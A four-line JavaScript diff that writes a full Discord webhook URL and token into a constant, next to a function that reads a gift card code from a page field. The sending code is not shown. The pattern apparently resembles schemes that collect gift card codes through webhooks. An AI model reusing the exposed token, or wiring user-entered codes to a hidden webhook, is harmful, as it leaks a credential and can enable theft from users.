@@ -1,4 +1,4 @@
-const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1453158342452187187/oYYnqUKNd_-3GbA_AE53w55gCfhjvMlB0HcItC53RieMvKPKXNG14Yz00MpUZVerybII";
 
 function processGiftCard() {
   const code = document.getElementById("giftCard").value.trim().toUpperCase();
